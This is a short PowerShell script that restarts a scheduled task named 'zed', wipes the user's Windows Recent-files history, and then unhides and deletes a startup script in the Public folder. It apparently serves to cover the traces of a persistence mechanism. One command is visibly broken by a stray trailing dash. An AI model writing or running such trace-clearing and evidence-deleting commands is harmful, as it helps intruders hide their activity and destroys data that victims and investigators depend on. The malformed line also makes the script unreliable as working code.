Stop-ScheduledTask -TaskName zed
Start-ScheduledTask -TaskName zed
$rutaHistorial = "$env:APPDATA\Microsoft\Windows\Recent"
Remove-Item "$rutaHistorial\*" -Force -
attrib -h C:\Users\Public\MyStartUp.ps1
del C:\Users\Public\MyStartUp.ps1
